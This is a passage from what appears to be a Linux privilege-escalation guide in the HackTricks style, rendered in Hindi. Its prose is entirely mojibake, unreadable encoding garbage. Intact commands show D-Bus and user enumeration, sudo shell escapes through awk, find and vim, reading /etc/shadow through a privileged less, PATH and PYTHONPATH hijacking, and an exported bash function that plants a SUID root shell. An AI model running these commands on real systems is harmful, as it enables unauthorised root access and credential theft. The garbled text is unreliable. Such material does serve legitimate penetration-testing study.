рдпрд╣ рдкреНрд░рдгрд╛рд▓реА рдмрд╣реБрдкрд░рдХрд╛рд░реА рд╣реИ, рдЬреЛ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рдмреАрдЪ рдбреЗрдЯрд╛ рд╡рд┐рдирд┐рдордп рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдмреБрдирд┐рдпрд╛рджреА IPC рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреА рд╣реИ, рдЬреЛ **рд╕реБрдзрд╛рд░рд┐рдд UNIX рдбреЛрдореЗрди рд╕реЙрдХреЗрдЯреНрд╕** рдХреА рдпрд╛рдж рджрд┐рд▓рд╛рддреА рд╣реИред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрд╣ рдШрдЯрдирд╛рдУрдВ рдпрд╛ рд╕рдВрдХреЗрддреЛрдВ рдХреЛ рдкреНрд░рд╕рд╛рд░рд┐рдд рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕рд┐рд╕реНрдЯрдо рдШрдЯрдХреЛрдВ рдХреЗ рдмреАрдЪ рдирд┐рд░реНрдмрд╛рдз рдПрдХреАрдХрд░рдг рдХреЛ рдмрдврд╝рд╛рд╡рд╛ рдорд┐рд▓рддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ рдЖрдиреЗ рд╡рд╛рд▓реА рдХреЙрд▓ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ Bluetooth рдбреЗрдорди рд╕реЗ рдПрдХ рд╕рдВрдХреЗрдд рдПрдХ рд╕рдВрдЧреАрдд рдЦрд┐рд▓рд╛рдбрд╝реА рдХреЛ рдореНрдпреВрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░реЗрд░рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдиреБрднрд╡ рдореЗрдВ рд╕реБрдзрд╛рд░ рд╣реЛрддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, D-Bus рдПрдХ рджреВрд░рд╕реНрде рдСрдмреНрдЬреЗрдХреНрдЯ рд╕рд┐рд╕реНрдЯрдо рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХреЗ рдмреАрдЪ рд╕реЗрд╡рд╛ рдЕрдиреБрд░реЛрдзреЛрдВ рдФрд░ рд╡рд┐рдзрд┐ рдХреЙрд▓ рдХреЛ рд╕рд░рд▓ рдмрдирд╛рддрд╛ рд╣реИ, рдЙрди рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рд╕реБрд╡реНрдпрд╡рд╕реНрдерд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдкрд╛рд░рдВрдкрд░рд┐рдХ рд░реВрдк рд╕реЗ рдЬрдЯрд┐рд▓ рдереАрдВред

D-Bus рдПрдХ **рдЕрдиреБрдорддрд┐/рдирд┐рд╖реЗрдз рдореЙрдбрд▓** рдкрд░ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рд╕рдВрджреЗрд╢ рдЕрдиреБрдорддрд┐рдпреЛрдВ (рд╡рд┐рдзрд┐ рдХреЙрд▓, рд╕рдВрдХреЗрдд рдЙрддреНрд╕рд░реНрдЬрди, рдЖрджрд┐) рдХрд╛ рдкреНрд░рдмрдВрдзрди рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдиреАрддрд┐ рдирд┐рдпрдореЛрдВ рдХреЗ рдорд┐рд▓рд╛рди рдХреЗ рд╕рдВрдЪрдпреА рдкреНрд░рднрд╛рд╡ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд╣реЛрддрд╛ рд╣реИред рдпреЗ рдиреАрддрд┐рдпрд╛рдБ рдмрд╕ рдХреЗ рд╕рд╛рде рдЗрдВрдЯрд░реИрдХреНрд╢рди рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддреА рд╣реИрдВ, рдЬреЛ рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╢реЛрд╖рдг рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЕрдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддреА рд╣реИрдВред

`/etc/dbus-1/system.d/wpa_supplicant.conf` рдореЗрдВ рдРрд╕реА рдиреАрддрд┐ рдХрд╛ рдПрдХ рдЙрджрд╛рд╣рд░рдг рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬреЛ рд░реВрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП `fi.w1.wpa_supplicant1` рд╕реЗ рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ, рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдФрд░ рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рд░рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдХреЛ рд╡рд┐рд╕реНрддреГрдд рдХрд░рддрд╛ рд╣реИред

рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдпрд╛ рд╕рдореВрд╣ рдХреЗ рдмрд┐рдирд╛ рдиреАрддрд┐рдпрд╛рдБ рд╕рд╛рд░реНрд╡рднреМрдорд┐рдХ рд░реВрдк рд╕реЗ рд▓рд╛рдЧреВ рд╣реЛрддреА рд╣реИрдВ, рдЬрдмрдХрд┐ "рдбрд┐рдлрд╝реЙрд▓реНрдЯ" рд╕рдВрджрд░реНрдн рдиреАрддрд┐рдпрд╛рдБ рдЙрди рд╕рднреА рдкрд░ рд▓рд╛рдЧреВ рд╣реЛрддреА рд╣реИрдВ рдЬреЛ рдЕрдиреНрдп рд╡рд┐рд╢рд┐рд╖реНрдЯ рдиреАрддрд┐рдпреЛрдВ рджреНрд╡рд╛рд░рд╛ рдХрд╡рд░ рдирд╣реАрдВ рдХреА рдЧрдИ рд╣реИрдВред
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**рдпрд╣рд╛рдБ D-Bus рд╕рдВрдЪрд╛рд░ рдХреЛ рд╕реВрдЪреАрдмрджреНрдз рдХрд░рдиреЗ рдФрд░ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рддрд░реАрдХреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдиреЗрдВ:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **рдиреЗрдЯрд╡рд░реНрдХ**

рдиреЗрдЯрд╡рд░реНрдХ рдХреЛ рд╕реВрдЪреАрдмрджреНрдз рдХрд░рдирд╛ рдФрд░ рдорд╢реАрди рдХреА рд╕реНрдерд┐рддрд┐ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рд╣рдореЗрд╢рд╛ рджрд┐рд▓рдЪрд╕реНрдк рд╣реЛрддрд╛ рд╣реИред

### рд╕рд╛рдорд╛рдиреНрдп рд╕реВрдЪреАрдмрджреНрдзрддрд╛
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

рд╣рдореЗрд╢рд╛ рдЙрди рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗрд╡рд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рдЬреЛ рдорд╢реАрди рдкрд░ рдЪрд▓ рд░рд╣реА рд╣реИрдВ рдЬрд┐рдирд╕реЗ рдЖрдк рдкрд╣рд▓реЗ рдмрд╛рддрдЪреАрдд рдирд╣реАрдВ рдХрд░ рд╕рдХреЗ:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ рд╕реНрдирд┐рдлрд╝ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рдЖрдк рдРрд╕рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдХреБрдЫ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

рдЪреЗрдХ рдХрд░реЗрдВ **who** рдЖрдк рд╣реИрдВ, рдЖрдкрдХреЗ рдкрд╛рд╕ рдХреМрди рд╕реЗ **privileges** рд╣реИрдВ, рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдХреМрди рд╕реЗ **users** рд╣реИрдВ, рдХреМрди рд╕реЗ **login** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдХреМрди рд╕реЗ **root privileges** рд░рдЦрддреЗ рд╣реИрдВ:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

рдХреБрдЫ Linux рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдХреЛ рдПрдХ рдмрдЧ рд╕реЗ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдЬреЛ **UID > INT\_MAX** рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА: [рдпрд╣рд╛рдБ](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [рдпрд╣рд╛рдБ](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) рдФрд░ [рдпрд╣рд╛рдБ](https://twitter.com/paragonsec/status/1071152249529884674)ред\
**рдЗрд╕реЗ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд░реЗрдВ**: **`systemd-run -t /bin/bash`**

### Groups

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рдореВрд╣ рдХреЗ рд╕рджрд╕реНрдп** рд╣реИрдВ рдЬреЛ рдЖрдкрдХреЛ рд░реВрдЯ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рджреЗ рд╕рдХрддрд╛ рд╣реИ:

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### Clipboard

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдХреНрд▓рд┐рдкрдмреЛрд░реНрдб рдХреЗ рдЕрдВрджрд░ рдХреБрдЫ рджрд┐рд▓рдЪрд╕реНрдк рд╣реИ (рдпрджрд┐ рд╕рдВрднрд╡ рд╣реЛ)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### рдкрд╛рд╕рд╡рд░реНрдб рдиреАрддрд┐
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### рдЬреНрдЮрд╛рдд рдкрд╛рд╕рд╡рд░реНрдб

рдпрджрд┐ рдЖрдк **рдкрд░реНрдпрд╛рд╡рд░рдг рдХрд╛ рдХреЛрдИ рдкрд╛рд╕рд╡рд░реНрдб рдЬрд╛рдирддреЗ рд╣реИрдВ** рддреЛ **рдкреНрд░рддреНрдпреЗрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ** рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред

### Su Brute

рдпрджрд┐ рдЖрдк рдмрд╣реБрдд рд╢реЛрд░ рдХрд░рдиреЗ рдХреА рдкрд░рд╡рд╛рд╣ рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ `su` рдФрд░ `timeout` рдмрд╛рдЗрдирд░реА рдХрдВрдкреНрдпреВрдЯрд░ рдкрд░ рдореМрдЬреВрдж рд╣реИрдВ, рддреЛ рдЖрдк [su-bruteforce](https://github.com/carlospolop/su-bruteforce) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИред

## рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп PATH рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

### $PATH

рдпрджрд┐ рдЖрдк рдкрд╛рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдк **$PATH рдХреЗ рдХрд┐рд╕реА рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рдЕрдВрджрд░ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ** рддреЛ рдЖрдк **рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рдЕрдВрджрд░ рдПрдХ рдмреИрдХрдбреЛрд░ рдмрдирд╛рдиреЗ** рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдХрд╛ рдирд╛рдо рдХрд┐рд╕реА рдХрдорд╛рдВрдб рдХреЗ рд╕рдорд╛рди рд╣реИ рдЬрд┐рд╕реЗ рдХрд┐рд╕реА рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ (рдЖрджрд░реНрд╢ рд░реВрдк рд╕реЗ рд░реВрдЯ) рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдЬреЛ **рдЖрдкрдХреЗ рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рдкрд╣рд▓реЗ рд╕реНрдерд┐рдд рдлрд╝реЛрд▓реНрдбрд░** рд╕реЗ рд▓реЛрдб рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

### SUDO рдФрд░ SUID

рдЖрдкрдХреЛ sudo рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреБрдЫ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛ рд╕рдХрддреА рд╣реИ рдпрд╛ рдЙрдирдХреЗ рдкрд╛рд╕ suid рдмрд┐рдЯ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕реЗ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
рдХреБрдЫ **рдЕрдирдкреЗрдХреНрд╖рд┐рдд рдХрдорд╛рдВрдб рдЖрдкрдХреЛ рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрдврд╝рдиреЗ рдФрд░/рдпрд╛ рд▓рд┐рдЦрдиреЗ рдпрд╛ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдПрдХ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИрдВред** рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдХрд┐рд╕реА рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдХреБрдЫ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддрд╛ рд╣реИ рдмрд┐рдирд╛ рдкрд╛рд╕рд╡рд░реНрдб рдЬрд╛рдиреЗред
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ `demo` `root` рдХреЗ рд░реВрдк рдореЗрдВ `vim` рдЪрд▓рд╛ рд╕рдХрддрд╛ рд╣реИ, рдЕрдм рд░реВрдЯ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдПрдХ ssh рдХреБрдВрдЬреА рдЬреЛрдбрд╝рдХрд░ рдпрд╛ `sh` рдХреЛ рдХреЙрд▓ рдХрд░рдХреЗ рдПрдХ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рддреБрдЪреНрдЫ рд╣реИред
```
sudo vim -c '!sh'
```
### SETENV

рдпрд╣ рдирд┐рд░реНрджреЗрд╢ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ **рдПрдХ рд╡рд╛рддрд╛рд╡рд░рдг рдЪрд░ рд╕реЗрдЯ рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬрдмрдХрд┐ рдХреБрдЫ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреЗ рд╕рдордп:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
рдЗрд╕ рдЙрджрд╛рд╣рд░рдг, **HTB рдорд╢реАрди Admirer** рдкрд░ рдЖрдзрд╛рд░рд┐рдд, **PYTHONPATH рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ** рдХреЗ рд▓рд┐рдП **рд╕рдВрд╡реЗрджрдирд╢реАрд▓** рдерд╛ рддрд╛рдХрд┐ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреЗ рд╕рдордп рдПрдХ рдордирдорд╛рдирд╛ рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo execution bypassing paths

**рдЕрдиреНрдп рдлрд╝рд╛рдЗрд▓реЛрдВ** рдХреЛ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдХреВрджреЗрдВ рдпрд╛ **рд╕рд┐рдВрдмреЙрд▓рд┐рдХ рд▓рд┐рдВрдХ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП sudoers рдлрд╝рд╛рдЗрд▓ рдореЗрдВ: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
рдпрджрд┐ **рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (\*), рддреЛ рдпрд╣ рдФрд░ рднреА рдЖрд╕рд╛рди рд╣реИ:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Countermeasures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo рдХрдорд╛рдВрдб/SUID рдмрд╛рдЗрдирд░реА рдмрд┐рдирд╛ рдХрдорд╛рдВрдб рдкрде рдХреЗ

рдпрджрд┐ **sudo рдЕрдиреБрдорддрд┐** рдПрдХрд▓ рдХрдорд╛рдВрдб рдХреЛ **рдкрде рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдП рдмрд┐рдирд╛** рджреА рдЧрдИ рд╣реИ: _hacker10 ALL= (root) less_ рддреЛ рдЖрдк рдЗрд╕реЗ PATH рд╡реЗрд░рд┐рдПрдмрд▓ рдХреЛ рдмрджрд▓рдХрд░ рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
рдпрд╣ рддрдХрдиреАрдХ рддрдм рднреА рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ рдпрджрд┐ рдПрдХ **suid** рдмрд╛рдЗрдирд░реА **рдмрд┐рдирд╛ рдкрде рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдП рдХрд┐рд╕реА рдЕрдиреНрдп рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреА рд╣реИ (рд╣рдореЗрд╢рд╛ рдПрдХ рдЕрдЬреАрдм SUID рдмрд╛рдЗрдирд░реА рдХреА рд╕рд╛рдордЧреНрд░реА рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** _**strings**_ **рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ)**ред

[Payload examples to execute.](payloads-to-execute.md)

### рдХрдорд╛рдВрдб рдкрде рдХреЗ рд╕рд╛рде SUID рдмрд╛рдЗрдирд░реА

рдпрджрд┐ **suid** рдмрд╛рдЗрдирд░реА **рдкрде рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддреЗ рд╣реБрдП рдХрд┐рд╕реА рдЕрдиреНрдп рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреА рд╣реИ**, рддреЛ рдЖрдк рдЙрд╕ рдХрдорд╛рдВрдб рдХреЗ рдирд╛рдо рд╕реЗ рдПрдХ **рдлрдВрдХреНрд╢рди** рдирд┐рд░реНрдпрд╛рдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ suid рдлрд╝рд╛рдЗрд▓ рдХреЙрд▓ рдХрд░ рд░рд╣реА рд╣реИред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдПрдХ suid рдмрд╛рдЗрдирд░реА _**/usr/sbin/service apache2 start**_ рдХреЛ рдХреЙрд▓ рдХрд░рддреА рд╣реИ, рддреЛ рдЖрдкрдХреЛ рдлрдВрдХреНрд╢рди рдмрдирд╛рдиреЗ рдФрд░ рдЙрд╕реЗ рдирд┐рд░реНрдпрд╛рдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
рдлрд┐рд░, рдЬрдм рдЖрдк suid рдмрд╛рдЗрдирд░реА рдХреЛ рдХреЙрд▓ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛

### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

**LD\_PRELOAD** рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХ рдпрд╛ рдЕрдзрд┐рдХ рд╕рд╛рдЭрд╛ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ (.so рдлрд╝рд╛рдЗрд▓реЗрдВ) рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рд▓реЛрдбрд░ рджреНрд╡рд╛рд░рд╛ рд╕рднреА рдЕрдиреНрдп рдХреЗ рдкрд╣рд▓реЗ рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЬрд┐рд╕рдореЗрдВ рдорд╛рдирдХ C рдкреБрд╕реНрддрдХрд╛рд▓рдп (`libc.so`) рднреА рд╢рд╛рдорд┐рд▓ рд╣реИред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЛ рдкреНрд░реАрд▓реЛрдб рдХрд░рдирд╛ рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╕рд┐рд╕реНрдЯрдо рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдмрдирд╛рдП рд░рдЦрдиреЗ рдФрд░ рдЗрд╕ рд╕реБрд╡рд┐рдзрд╛ рдХреЗ рджреБрд░реБрдкрдпреЛрдЧ рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ **suid/sgid** рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЧреНрдп рдХреЗ рд╕рд╛рде, рд╕рд┐рд╕реНрдЯрдо рдХреБрдЫ рд╢рд░реНрддреЛрдВ рдХреЛ рд▓рд╛рдЧреВ рдХрд░рддрд╛ рд╣реИ:

